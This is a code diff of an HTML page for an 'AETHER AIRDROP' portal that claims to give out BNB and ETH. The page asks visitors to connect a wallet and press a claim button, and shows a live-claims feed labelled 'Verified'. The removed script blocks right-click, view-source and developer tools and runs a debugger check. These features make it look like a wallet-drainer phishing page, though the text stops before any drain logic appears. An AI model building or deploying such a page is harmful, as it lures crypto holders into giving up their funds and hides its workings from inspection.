@@ -1,1103 +1,881 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
-    <title>🎁 AETHER AIRDROP | Advanced Claim Portal</title>
+    <title>🎁 AETHER AIRDROP | BNB & ETH Claim Portal</title>
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-
-<!-- Social Meta Tags -->
-<meta property="og:title" content="AETHER | Premium Airdrop Claim">
-<meta property="og:description" content="Experience the future of airdrops. Claim your exclusive rewards.">
-<meta property="og:type" content="website">
-
-<!-- Fonts & Libraries -->
-<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-
-<style>
-    :root {
-        /* Default Theme (Ethereum) */
-        --bg-deep: #050508;
-        --bg-panel: rgba(12, 12, 18, 0.85);
-        --accent-main: #627eea; /* Ethereum Blue */
-        --accent-glow: rgba(98, 126, 234, 0.4);
-        --accent-text: #627eea;
-        --btn-gradient: linear-gradient(135deg, #627eea, #8a2be2);
-        --btn-shadow: 0 4px 15px rgba(98, 126, 234, 0.4);
-        --btn-hover-shadow: 0 6px 25px rgba(98, 126, 234, 0.6);
-        --text-bright: #ffffff;
-        --text-dim: #8a8a9a;
-        --glass-border: rgba(255, 255, 255, 0.08);
-    }
-
-    /* BNB Theme */
-    body.theme-bnb {
-        --accent-main: #F0B90B; /* BNB Yellow */
-        --accent-glow: rgba(240, 185, 11, 0.4);
-        --accent-text: #F0B90B;
-        --btn-gradient: linear-gradient(135deg, #F0B90B, #d6a00a);
-        --btn-shadow: 0 4px 15px rgba(240, 185, 11, 0.3);
-        --btn-hover-shadow: 0 6px 25px rgba(240, 185, 11, 0.5);
-    }
-
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: 'Inter', sans-serif;
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-    }
-
-    body {
-        background-color: var(--bg-deep);
-        color: var(--text-bright);
-        min-height: 100vh;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        overflow-x: hidden;
-        position: relative;
-        transition: background 0.5s ease;
-    }
-
-    /* Dynamic Background */
-    .bg-canvas {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        z-index: -2;
-        background: radial-gradient(circle at 50% 0%, var(--accent-glow) 0%, transparent 50%), 
-                    radial-gradient(circle at 80% 50%, rgba(0, 242, 255, 0.05) 0%, transparent 40%);
-        transition: background 0.5s ease;
-    }
-
-    .floating-list-bg {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        z-index: -1;
-        overflow: hidden;
-        pointer-events: none;
-    }
-
-    .float-item {
-        position: absolute;
-        color: rgba(255, 255, 255, 0.03);
-        font-family: 'Orbitron', sans-serif;
-        font-weight: 700;
-        font-size: 24px;
-        animation: floatUp linear infinite;
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        pointer-events: none;
-    }
-
-    @keyframes floatUp {
-        0% { transform: translateY(110vh); opacity: 0; }
-        10% { opacity: 0.15; }
-        90% { opacity: 0.15; }
-        100% { transform: translateY(-10vh); opacity: 0; }
-    }
-
-    .grid-overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        z-index: -1;
-        background-image: 
-            linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
-            linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
-        background-size: 60px 60px;
-        mask-image: linear-gradient(to bottom, transparent, black 20%, black 80%, transparent);
-    }
-
-    .main-container {
-        width: 100%;
-        max-width: 420px;
-        padding: 20px;
-        position: relative;
-        z-index: 10;
-    }
-
-    .app-header {
-        text-align: center;
-        margin-bottom: 30px;
-        animation: fadeDown 0.8s ease-out;
-    }
-
-    .logo-container {
-        width: 90px;
-        height: 90px;
-        margin: 0 auto 15px;
-        position: relative;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-    }
-
-    .logo-glow {
-        position: absolute;
-        width: 120%;
-        height: 120%;
-        background: radial-gradient(circle, var(--accent-glow) 0%, transparent 70%);
-        animation: pulseGlow 4s infinite ease-in-out;
-        z-index: 1;
-        transition: background 0.5s ease;
-    }
-
-    .logo-img {
-        width: 80px;
-        height: 80px;
-        position: relative;
-        z-index: 2;
-        filter: drop-shadow(0 0 15px var(--accent-main));
-        transition: filter 0.3s ease, transform 0.3s ease;
-    }
     
-    .logo-img:hover {
-        transform: scale(1.1) rotate(5deg);
-    }
+    <!-- Social Meta Tags -->
+    <meta property="og:title" content="AETHER | BNB & ETH Airdrop Claim">
+    <meta property="og:description" content="Claim your BNB & ETH airdrop rewards.">
+    <meta property="og:type" content="website">
 
-    .app-title {
-        font-family: 'Orbitron', sans-serif;
-        font-size: 32px;
-        font-weight: 700;
-        letter-spacing: 4px;
-        text-transform: uppercase;
-        background: linear-gradient(to right, #fff, var(--accent-main));
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        margin-bottom: 5px;
-        transition: background 0.3s ease;
-    }
+    <!-- Fonts & Libraries -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
-    .app-subtitle {
-        font-size: 12px;
-        color: var(--accent-main);
-        letter-spacing: 2px;
-        text-transform: uppercase;
-        font-weight: 500;
-        transition: color 0.3s ease;
-    }
+    <style>
+        :root {
+            --bg-deep: #050508;
+            --bg-panel: rgba(12, 12, 18, 0.85);
+            --accent-main: #F0B90B;
+            --accent-glow: rgba(240, 185, 11, 0.4);
+            --accent-text: #F0B90B;
+            --btn-gradient: linear-gradient(135deg, #F0B90B, #d6a00a);
+            --btn-shadow: 0 4px 15px rgba(240, 185, 11, 0.3);
+            --btn-hover-shadow: 0 6px 25px rgba(240, 185, 11, 0.5);
+            --text-bright: #ffffff;
+            --text-dim: #8a8a9a;
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --eth-color: #627eea;
+        }
 
-    .card {
-        background: var(--bg-panel);
-        border: 1px solid var(--glass-border);
-        border-radius: 24px;
-        padding: 30px 25px;
-        backdrop-filter: blur(25px);
-        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
-        position: relative;
-        overflow: hidden;
-        animation: cardEntry 0.8s cubic-bezier(0.16, 1, 0.3, 1);
-    }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
 
-    .card::before {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        height: 1px;
-        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.5), transparent);
-        z-index: 1;
-    }
+        body {
+            background-color: var(--bg-deep);
+            color: var(--text-bright);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+            position: relative;
+        }
 
-    .section-label {
-        font-size: 11px;
-        color: var(--text-dim);
-        text-transform: uppercase;
-        letter-spacing: 1.5px;
-        margin-bottom: 15px;
-        display: flex;
-        align-items: center;
-        gap: 8px;
-    }
-    
-    .section-label::after {
-        content: '';
-        flex: 1;
-        height: 1px;
-        background: var(--glass-border);
-    }
+        .bg-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            background: radial-gradient(circle at 50% 0%, var(--accent-glow) 0%, transparent 50%);
+        }
 
-    .network-list {
-        display: flex;
-        flex-direction: column;
-        gap: 12px;
-        margin-bottom: 25px;
-    }
+        .grid-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background-image: 
+                linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+            background-size: 60px 60px;
+        }
 
-    .network-item {
-        display: flex;
-        align-items: center;
-        padding: 16px;
-        background: rgba(255, 255, 255, 0.02);
-        border: 1px solid rgba(255, 255, 255, 0.05);
-        border-radius: 16px;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        position: relative;
-        overflow: hidden;
-    }
+        .main-container {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
+            position: relative;
+            z-index: 10;
+        }
 
-    .network-item:hover {
-        background: rgba(255, 255, 255, 0.04);
-        border-color: rgba(255, 255, 255, 0.1);
-    }
+        .app-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
 
-    .network-item.active {
-        border-color: var(--accent-main);
-        background: rgba(255, 255, 255, 0.05);
-        box-shadow: 0 0 20px var(--accent-glow);
-    }
+        .logo-container {
+            width: 90px;
+            height: 90px;
+            margin: 0 auto 15px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-    .network-item.active .selector-circle {
-        border-color: var(--accent-main);
-        background: var(--accent-main);
-        box-shadow: 0 0 10px var(--accent-main);
-    }
+        .logo-glow {
+            position: absolute;
+            width: 120%;
+            height: 120%;
+            background: radial-gradient(circle, var(--accent-glow) 0%, transparent 70%);
+            animation: pulseGlow 4s infinite ease-in-out;
+        }
 
-    .network-item.active .selector-circle::after {
-        opacity: 1;
-    }
+        .logo-img {
+            width: 80px;
+            height: 80px;
+            position: relative;
+            z-index: 2;
+            filter: drop-shadow(0 0 15px var(--accent-main));
+        }
 
-    .network-icon {
-        width: 40px;
-        height: 40px;
-        border-radius: 12px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin-right: 15px;
-        background: rgba(255, 255, 255, 0.05);
-    }
+        .app-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            background: linear-gradient(to right, #fff, var(--accent-main));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 5px;
+        }
 
-    .network-icon img {
-        width: 25px;
-        height: 25px;
-        object-fit: contain;
-    }
+        .app-subtitle {
+            font-size: 12px;
+            color: var(--accent-main);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            font-weight: 500;
+        }
 
-    .network-info {
-        flex: 1;
-    }
+        .card {
+            background: var(--bg-panel);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 30px 25px;
+            backdrop-filter: blur(25px);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
 
-    .network-name {
-        font-weight: 600;
-        font-size: 15px;
-        margin-bottom: 2px;
-    }
+        .section-label {
+            font-size: 11px;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .section-label::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--glass-border);
+        }
 
-    .network-desc {
-        font-size: 12px;
-        color: var(--text-dim);
-    }
+        .network-selector {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
 
-    .selector-circle {
-        width: 20px;
-        height: 20px;
-        border-radius: 50%;
-        border: 2px solid rgba(255, 255, 255, 0.2);
-        position: relative;
-        transition: all 0.3s ease;
-    }
+        .network-btn {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            background: rgba(255,255,255,0.02);
+            color: var(--text-dim);
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
 
-    .selector-circle::after {
-        content: '';
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        width: 8px;
-        height: 8px;
-        background: white;
-        border-radius: 50%;
-        opacity: 0;
-        transition: opacity 0.2s;
-    }
+        .network-btn.active {
+            background: var(--accent-glow);
+            border-color: var(--accent-main);
+            color: var(--accent-main);
+            box-shadow: 0 0 20px var(--accent-glow);
+        }
 
-    .btn-group {
-        display: flex;
-        flex-direction: column;
-        gap: 12px;
-        margin-bottom: 20px;
-    }
+        .network-btn.eth {
+            border-color: var(--eth-color);
+        }
 
-    .cyber-btn {
-        position: relative;
-        padding: 16px;
-        border: none;
-        border-radius: 14px;
-        font-size: 14px;
-        font-weight: 600;
-        letter-spacing: 0.5px;
-        cursor: pointer;
-        overflow: hidden;
-        transition: transform 0.1s, box-shadow 0.3s, background 0.3s;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 10px;
-        text-transform: uppercase;
-        font-family: 'Orbitron', sans-serif;
-    }
+        .network-btn.eth.active {
+            background: rgba(98, 126, 234, 0.2);
+            border-color: var(--eth-color);
+            color: var(--eth-color);
+            box-shadow: 0 0 20px rgba(98, 126, 234, 0.4);
+        }
 
-    .cyber-btn:active {
-        transform: scale(0.98);
-    }
+        .network-info-box {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--accent-main);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
 
-    .btn-primary {
-        background: var(--btn-gradient);
-        color: white;
-        box-shadow: var(--btn-shadow);
-    }
+        .network-name-badge {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--accent-main);
+            margin-bottom: 5px;
+        }
 
-    .btn-primary:hover {
-        box-shadow: var(--btn-hover-shadow);
-        transform: translateY(-2px);
-    }
+        .network-desc-badge {
+            font-size: 12px;
+            color: var(--text-dim);
+        }
 
-    .btn-ghost {
-        background: rgba(255, 255, 255, 0.03);
-        border: 1px solid rgba(255, 255, 255, 0.1);
-        color: white;
-    }
+        .network-desc-badge.eth {
+            color: var(--eth-color);
+        }
 
-    .btn-ghost:hover {
-        background: rgba(255, 255, 255, 0.08);
-        border-color: rgba(255, 255, 255, 0.2);
-    }
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
 
-    .btn-claim {
-        background: linear-gradient(135deg, #00f2ff, #0072ff);
-        color: white;
-        box-shadow: 0 4px 20px rgba(0, 242, 255, 0.3);
-        margin-top: 10px;
-    }
-    
-    .btn-claim:disabled {
-        opacity: 0.4;
-        cursor: not-allowed;
-        transform: none !important;
-        box-shadow: none;
-    }
+        .cyber-btn {
+            position: relative;
+            padding: 16px;
+            border: none;
+            border-radius: 14px;
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            overflow: hidden;
+            transition: transform 0.1s, box-shadow 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-transform: uppercase;
+            font-family: 'Orbitron', sans-serif;
+        }
 
-    .cyber-btn::before {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: -100%;
-        width: 100%;
-        height: 100%;
-        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-        transition: 0.5s;
-    }
+        .cyber-btn:active {
+            transform: scale(0.98);
+        }
 
-    .cyber-btn:hover::before {
-        left: 100%;
-    }
+        .btn-primary {
+            background: var(--btn-gradient);
+            color: white;
+            box-shadow: var(--btn-shadow);
+        }
 
-    .btn-loading {
-        pointer-events: none;
-        color: transparent !important;
-    }
-    
-    .btn-loading::after {
-        content: '';
-        position: absolute;
-        width: 20px;
-        height: 20px;
-        border: 2px solid rgba(255,255,255,0.3);
-        border-top-color: #fff;
-        border-radius: 50%;
-        animation: spin 0.8s linear infinite;
-    }
+        .btn-primary:hover {
+            box-shadow: var(--btn-hover-shadow);
+            transform: translateY(-2px);
+        }
 
-    @keyframes spin {
-        to { transform: rotate(360deg); }
-    }
+        .btn-claim {
+            background: linear-gradient(135deg, #F0B90B, #d6a00a);
+            color: white;
+            box-shadow: 0 4px 20px rgba(240, 185, 11, 0.3);
+            margin-top: 10px;
+        }
 
-    .status-box {
-        background: rgba(0, 0, 0, 0.3);
-        border-radius: 12px;
-        padding: 14px;
-        margin-bottom: 15px;
-        text-align: center;
-        font-size: 13px;
-        color: var(--text-dim);
-        border: 1px solid transparent;
-        transition: all 0.3s ease;
-        display: none;
-    }
+        .btn-claim.eth {
+            background: linear-gradient(135deg, var(--eth-color), #5469d4);
+            box-shadow: 0 4px 20px rgba(98, 126, 234, 0.3);
+        }
+        
+        .btn-claim:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none;
+        }
 
-    .status-box.active { display: block; }
-    .status-box.error { color: #ff4d4d; border-color: rgba(255, 77, 77, 0.3); background: rgba(255, 77, 77, 0.05); }
-    .status-box.success { color: #00ff9d; border-color: rgba(0, 255, 157, 0.3); background: rgba(0, 255, 157, 0.05); }
-    .status-box.warning { color: #ffb700; border-color: rgba(255, 183, 0, 0.3); background: rgba(255, 183, 0, 0.05); }
+        .btn-loading {
+            pointer-events: none;
+            color: transparent !important;
+        }
+        
+        .btn-loading::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
 
-    .wallet-badge {
-        display: none;
-        background: rgba(255, 255, 255, 0.05);
-        padding: 10px 15px;
-        border-radius: 8px;
-        font-size: 13px;
-        color: var(--accent-main);
-        margin-bottom: 15px;
-        text-align: center;
-        border: 1px solid var(--accent-main);
-        animation: fadeIn 0.5s ease;
-        transition: all 0.3s ease;
-    }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
 
-    .live-feed-section {
-        margin-top: 25px;
-        border-top: 1px solid rgba(255,255,255,0.05);
-        padding-top: 15px;
-    }
+        .status-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 15px;
+            text-align: center;
+            font-size: 13px;
+            color: var(--text-dim);
+            border: 1px solid transparent;
+            display: none;
+        }
 
-    .live-header {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        margin-bottom: 15px;
-    }
+        .status-box.active { display: block; }
+        .status-box.error { color: #ff4d4d; border-color: rgba(255, 77, 77, 0.3); background: rgba(255, 77, 77, 0.05); }
+        .status-box.success { color: #00ff9d; border-color: rgba(0, 255, 157, 0.3); background: rgba(0, 255, 157, 0.05); }
+        .status-box.warning { color: #ffb700; border-color: rgba(255, 183, 0, 0.3); background: rgba(255, 183, 0, 0.05); }
 
-    .live-title {
-        font-size: 12px;
-        color: var(--text-dim);
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        display: flex;
-        align-items: center;
-        gap: 6px;
-    }
+        .wallet-badge {
+            display: none;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 13px;
+            color: var(--accent-main);
+            margin-bottom: 15px;
+            text-align: center;
+            border: 1px solid var(--accent-main);
+        }
 
-    .live-dot {
-        width: 8px;
-        height: 8px;
-        background: #00ff9d;
-        border-radius: 50%;
-        animation: blink 2s infinite;
-        box-shadow: 0 0 5px #00ff9d;
-    }
+        .balance-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid var(--glass-border);
+        }
 
-    @keyframes blink {
-        0%, 100% { opacity: 1; }
-        50% { opacity: 0.3; }
-    }
+        .balance-label {
+            font-size: 11px;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
 
-    .tx-list {
-        display: flex;
-        flex-direction: column;
-        gap: 8px;
-        max-height: 200px;
-        overflow: hidden;
-        position: relative;
-    }
+        .balance-amount {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--accent-main);
+        }
 
-    .tx-item {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        background: rgba(255,255,255,0.02);
-        padding: 10px 12px;
-        border-radius: 8px;
-        border-left: 2px solid transparent;
-        animation: slideIn 0.5s ease forwards;
-        opacity: 0;
-        transform: translateY(10px);
-    }
+        .balance-amount.eth {
+            color: var(--eth-color);
+        }
 
-    @keyframes slideIn {
-        to { opacity: 1; transform: translateY(0); }
-    }
+        .balance-symbol {
+            font-size: 14px;
+            color: var(--text-dim);
+            margin-left: 5px;
+        }
 
-    .tx-item.eth { border-left-color: #627eea; }
-    .tx-item.bnb { border-left-color: #F0B90B; }
+        .live-feed-section {
+            margin-top: 25px;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            padding-top: 15px;
+        }
 
-    .tx-user {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-    }
+        .live-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
 
-    .tx-avatar {
-        width: 24px;
-        height: 24px;
-        border-radius: 50%;
-        background: rgba(255,255,255,0.1);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 10px;
-    }
+        .live-title {
+            font-size: 12px;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
 
-    .tx-address {
-        font-size: 12px;
-        color: #ccc;
-        font-family: monospace;
-    }
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: #00ff9d;
+            border-radius: 50%;
+            animation: blink 2s infinite;
+        }
 
-    .tx-amount {
-        font-size: 12px;
-        font-weight: 600;
-        color: #00ff9d;
-    }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
 
-    .tx-time {
-        font-size: 10px;
-        color: var(--text-dim);
-    }
+        .tx-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            max-height: 200px;
+            overflow: hidden;
+        }
 
-    .footer-links {
-        margin-top: 20px;
-        text-align: center;
-    }
-    
-    .moonpay-link {
-        color: var(--text-dim);
-        text-decoration: none;
-        font-size: 12px;
-        transition: color 0.2s;
-        display: inline-flex;
-        align-items: center;
-        gap: 5px;
-    }
-    
-    .moonpay-link:hover { color: var(--accent-main); }
+        .tx-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(255,255,255,0.02);
+            padding: 10px 12px;
+            border-radius: 8px;
+            border-left: 2px solid #F0B90B;
+        }
 
-    @keyframes fadeDown {
-        from { opacity: 0; transform: translateY(-20px); }
-        to { opacity: 1; transform: translateY(0); }
-    }
+        .tx-item.eth {
+            border-left-color: var(--eth-color);
+        }
 
-    @keyframes cardEntry {
-        from { opacity: 0; transform: scale(0.95) translateY(20px); }
-        to { opacity: 1; transform: scale(1) translateY(0); }
-    }
+        .tx-user {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
 
-    @keyframes pulseGlow {
-        0%, 100% { opacity: 0.6; transform: scale(1); }
-        50% { opacity: 0.9; transform: scale(1.2); }
-    }
-    
-    @keyframes fadeIn {
-        from { opacity: 0; }
-        to { opacity: 1; }
-    }
+        .tx-avatar {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+        }
 
-    @media (max-width: 480px) {
-        .app-title { font-size: 24px; }
-        .card { padding: 25px 20px; }
-    }
-</style>
+        .tx-address {
+            font-size: 12px;
+            color: #ccc;
+            font-family: monospace;
+        }
 
+        .tx-amount {
+            font-size: 12px;
+            font-weight: 600;
+            color: #00ff9d;
+        }
+
+        .tx-time {
+            font-size: 10px;
+            color: var(--text-dim);
+        }
+
+        .footer-links {
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .moonpay-link {
+            color: var(--text-dim);
+            text-decoration: none;
+            font-size: 12px;
+            transition: color 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .moonpay-link:hover { color: var(--accent-main); }
+
+        @keyframes pulseGlow {
+            0%, 100% { opacity: 0.6; transform: scale(1); }
+            50% { opacity: 0.9; transform: scale(1.2); }
+        }
+    </style>
 </head>
-<body class="theme-eth">
+<body>
     <div class="bg-canvas"></div>
     <div class="grid-overlay"></div>
 
-<div class="floating-list-bg" id="floatingBg"></div>
+    <div class="main-container">
+        <header class="app-header">
+            <div class="logo-container">
+                <div class="logo-glow"></div>
+                <i class="fab fa-btc logo-img" style="font-size: 80px; color: #F0B90B;"></i>
+            </div>
+            <h1 class="app-title">AETHER</h1>
+            <div class="app-subtitle">Multi-Chain Airdrop</div>
+        </header>
 
-<div class="main-container">
-    <header class="app-header">
-        <div class="logo-container">
-            <div class="logo-glow"></div>
-            <svg id="logoSvg" class="logo-img" viewBox="0 0 256 417" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid">
-                <path fill="#343434" d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" opacity=".1"/>
-                <path fill="#848484" d="M127.962 0L0 212.32l127.962 75.639V154.158z" opacity=".2"/>
-                <path fill="#343434" d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" opacity=".1"/>
-                <path fill="#848484" d="M127.962 416.905v-104.72L0 236.585z" opacity=".2"/>
-                <path fill="#C4C4C4" d="M127.961 287.958l127.96-75.637-127.96-58.162z"/>
-                <path fill="#848484" d="M0 212.32l127.96 75.638v-133.8z"/>
-            </svg>
-        </div>
-        <h1 class="app-title">AETHER</h1>
-        <div class="app-subtitle">Premium Claim Portal</div>
-    </header>
-
-    <div class="card">
-        <div class="section-label">Select Network</div>
-        
-        <div class="network-list">
-            <div class="network-item active" data-chain="1">
-                <div class="network-icon">
-                    <i class="fab fa-ethereum" style="font-size: 24px; color: #627eea;"></i>
-                </div>
-                <div class="network-info">
-                    <div class="network-name">Ethereum (ERC20)</div>
-                    <div class="network-desc">Secure • Main Network</div>
-                </div>
-                <div class="selector-circle"></div>
+        <div class="card">
+            <div class="network-selector">
+                <button class="network-btn active" data-network="bsc">
+                    <i class="fas fa-coins"></i> BNB
+                </button>
+                <button class="network-btn eth" data-network="eth">
+                    <i class="fab fa-ethereum"></i> ETH
+                </button>
             </div>
 
-            <div class="network-item" data-chain="56">
-                <div class="network-icon">
-                
-                </div>
-                <div class="network-info">
-                    <div class="network-name">BNB Smart Chain</div>
-                    <div class="network-desc">Low Fees • Fast</div>
-                </div>
-                <div class="selector-circle"></div>
+            <div class="network-info-box">
+                <div class="network-name-badge" id="networkName">BNB Smart Chain</div>
+                <div class="network-desc-badge" id="networkDesc">Low Fees • Fast Transactions</div>
             </div>
-        </div>
 
-        <div id="walletBadge" class="wallet-badge">
-            <i class="fas fa-check-circle"></i> Connected: <span id="walletAddress">...</span>
-        </div>
+            <div id="walletBadge" class="wallet-badge">
+                <i class="fas fa-check-circle"></i> Connected: <span id="walletAddress">...</span>
+            </div>
 
-        <div id="statusBox" class="status-box active">
-            <i class="fas fa-info-circle"></i> Connect wallet to check eligibility
-        </div>
+            <div id="statusBox" class="status-box active">
+                <i class="fas fa-info-circle"></i> Connect wallet to check eligibility
+            </div>
 
-        <div class="btn-group">
-            <button id="injectBtn" class="cyber-btn btn-primary">
-                <i class="fas fa-wallet"></i> Connect Wallet
+            <div class="balance-box" id="balanceBox" style="display: none;">
+                <div class="balance-label">Your Balance</div>
+                <div><span class="balance-amount" id="balanceAmount">0</span><span class="balance-symbol" id="balanceSymbol">BNB</span></div>
+            </div>
+
+            <div class="btn-group">
+                <button id="connectBtn" class="cyber-btn btn-primary">
+                    <i class="fas fa-wallet"></i> Connect Wallet
+                </button>
+            </div>
+
+            <button id="claimBtn" class="cyber-btn btn-claim" disabled>
+                <i class="fas fa-gift"></i> Claim Airdrop
             </button>
-            <button id="wcBtn" class="cyber-btn btn-ghost">
-                <i class="fas fa-qrcode"></i> WalletConnect
-            </button>
-        </div>
 
-        <button id="approveBtn" class="cyber-btn btn-claim" disabled>
-            <i class="fas fa-gift"></i> Claim Airdrop
-        </button>
-
-        <div class="live-feed-section">
-            <div class="live-header">
-                <div class="live-title"><div class="live-dot"></div> Live Claims</div>
-                <span style="font-size: 10px; color: var(--text-dim);">Verified</span>
+            <div class="live-feed-section">
+                <div class="live-header">
+                    <div class="live-title"><div class="live-dot"></div> Live Claims</div>
+                    <span id="liveNetwork" style="font-size: 10px; color: var(--text-dim);">BNB Network</span>
+                </div>
+                <div class="tx-list" id="txList"></div>
             </div>
-            <div class="tx-list" id="txList"></div>
-        </div>
 
-        <div class="footer-links">
-            <a href="#" id="moonpayLink" class="moonpay-link" target="_blank">
-                <i class="fas fa-gas-pump"></i> Need Gas? Buy with MoonPay
-            </a>
+            <div class="footer-links">
+                <a href="https://buy.moonpay.com?currencyCode=bnb" id="moonpayLink" class="moonpay-link" target="_blank">
+                    <i class="fas fa-gas-pump"></i> Need Gas? Buy with MoonPay
+                </a>
+            </div>
         </div>
     </div>
-</div>
 
-<script>
-    // ================= SECURITY PROTECTION =================
-    document.addEventListener('contextmenu', e => e.preventDefault(), false);
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || (e.ctrlKey && e.key === 'U') || (e.ctrlKey && e.key === 'S')) {
-            e.preventDefault();
-            return false;
-        }
-    }, false);
-
-    (function() {
-        function checkDevTools() {
-            const before = new Date().getTime();
-            debugger;
-            const after = new Date().getTime();
